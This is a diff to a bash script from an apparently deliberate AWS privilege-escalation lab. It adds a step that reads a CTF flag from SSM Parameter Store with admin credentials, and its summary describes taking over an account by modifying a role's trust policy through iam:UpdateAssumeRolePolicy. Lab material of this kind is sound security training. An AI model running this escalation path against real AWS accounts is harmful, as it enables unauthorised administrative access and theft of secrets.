@@ -267,6 +267,18 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 11: Capture the flag
+echo -e "${YELLOW}Step 11: Capture the Flag${NC}"
+echo "Reading CTF flag from SSM Parameter Store using admin credentials..."
+
+show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/iam-012-to-admin --query 'Parameter.Value' --output text"
+CTF_FLAG=$(aws ssm get-parameter \
+    --name "/pathfinding-labs/flags/iam-012-to-admin" \
+    --query 'Parameter.Value' \
+    --output text)
+
+echo -e "${GREEN}✓ Flag captured: ${CTF_FLAG}${NC}\n"
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
@@ -280,6 +292,7 @@ echo "2. Used iam:UpdateAssumeRolePolicy to modify $TARGET_ROLE trust policy"
 echo "3. Added our user as a trusted principal"
 echo "4. Assumed the $TARGET_ROLE (which has AdministratorAccess)"
 echo "5. Achieved: Full administrative access to the AWS account"
+echo "6. Captured CTF flag from SSM: $CTF_FLAG"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo "  $STARTING_USER → (iam:UpdateAssumeRolePolicy) → Modify Trust → (sts:AssumeRole) → $TARGET_ROLE → Administrator"
